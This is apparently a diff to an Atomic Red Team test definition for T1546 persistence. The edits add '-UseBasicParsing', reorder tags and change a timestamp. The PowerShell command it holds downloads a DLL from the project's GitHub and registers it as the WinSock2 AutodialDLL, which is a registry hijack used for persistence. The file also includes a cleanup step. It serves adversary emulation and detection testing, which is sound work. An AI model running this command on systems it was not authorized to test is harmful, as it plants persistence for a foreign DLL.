@@ -15,9 +15,9 @@
         command: 'if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll)
           { exit 0} else { exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\"
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll"
-          -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"; fi; Set-ItemProperty
-          HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL
-          -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll'
+          -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll" -UseBasicParsing;
+          fi; Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters
+          -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll'
         cleanup: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters
           -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
         elevation_required: true
@@ -27,9 +27,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - persistence
   - t1546
+  - persistence
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     dependencies:
@@ -44,9 +44,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll"
-        -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"
+        -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll" -UseBasicParsing
 
         '
     technique_created: '2020-01-22T21:04:23.285Z'
     atomic_guid: aca9ae16-7425-4b6d-8c30-cad306fdbd5b
-    import_timestamp: '2026-10-20T07:08:28.980805Z'
+    import_timestamp: '2026-10-21T07:01:51.051339Z'
